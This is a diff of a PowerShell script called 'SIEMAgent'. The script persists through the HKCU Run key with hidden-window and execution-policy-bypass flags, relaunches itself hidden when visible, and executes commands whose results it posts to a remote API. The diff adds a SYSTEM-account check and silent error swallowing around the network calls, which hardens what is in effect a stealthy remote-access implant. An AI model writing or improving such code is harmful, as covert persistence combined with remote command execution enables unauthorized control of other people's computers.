@@ -5,19 +5,23 @@ param(
 $hostname = $env:COMPUTERNAME
 
 # ---------------------------------------------------------
-# Self-install to HKCU Run
+# Detect if running as SYSTEM
 # ---------------------------------------------------------
-$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$scriptPath = $PSCommandPath
-
-if (-not (Get-ItemProperty -Path $runKey -Name "SIEMAgent" -ErrorAction SilentlyContinue)) {
-    Set-ItemProperty -Path $runKey -Name "SIEMAgent" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
-}
+$isSystem = ([Security.Principal.WindowsIdentity]::GetCurrent().Name -eq "NT AUTHORITY\SYSTEM")
 
 # ---------------------------------------------------------
-# Relaunch hidden if visible
+# HKCU Persistence (User Mode Only)
 # ---------------------------------------------------------
-Add-Type @"
+if (-not $isSystem) {
+    $runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+    $scriptPath = $PSCommandPath
+
+    if (-not (Get-ItemProperty -Path $runKey -Name "SIEMAgent" -ErrorAction SilentlyContinue)) {
+        Set-ItemProperty -Path $runKey -Name "SIEMAgent" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
+    }
+
+    # Relaunch hidden if visible
+    Add-Type @"
 using System;
 using System.Runtime.InteropServices;
 public class Win {
@@ -26,11 +30,12 @@ public class Win {
 }
 "@
 
-$h = (Get-Process -Id $PID).MainWindowHandle
+    $h = (Get-Process -Id $PID).MainWindowHandle
 
-if ($h -ne 0 -and [Win]::IsWindowVisible($h)) {
-    Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`""
-    exit
+    if ($h -ne 0 -and [Win]::IsWindowVisible($h)) {
+        Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`""
+        exit
+    }
 }
 
 # ---------------------------------------------------------
@@ -44,7 +49,10 @@ function Send-Heartbeat {
         message   = "alive"
     }
 
-    Invoke-RestMethod -Uri "$ApiUrl/report" -Method POST -Body ($payload | ConvertTo-Json) -ContentType "application/json"
+    try {
+        Invoke-RestMethod -Uri "$ApiUrl/report" -Method POST -Body ($payload | ConvertTo-Json) -ContentType "application/json"
+    }
+    catch {}
 }
 
 # ---------------------------------------------------------
@@ -71,6 +79,7 @@ function Execute-Command($cmd) {
         return "Execution error: $($_.Exception.Message)"
     }
 }
+
 # ---------------------------------------------------------
 # Send command result
 # ---------------------------------------------------------
@@ -83,11 +92,14 @@ function Send-Result($cmdId, $result) {
         output     = $result
     }
 
-    Invoke-RestMethod -Uri "$ApiUrl/report" -Method POST -Body ($payload | ConvertTo-Json -Depth 5) -ContentType "application/json"
+    try {
+        Invoke-RestMethod -Uri "$ApiUrl/report" -Method POST -Body ($payload | ConvertTo-Json -Depth 5) -ContentType "application/json"
+    }
+    catch {}
 }
 
 # ---------------------------------------------------------
-# Main loop
+# Main Loop
 # ---------------------------------------------------------
 while ($true) {
 
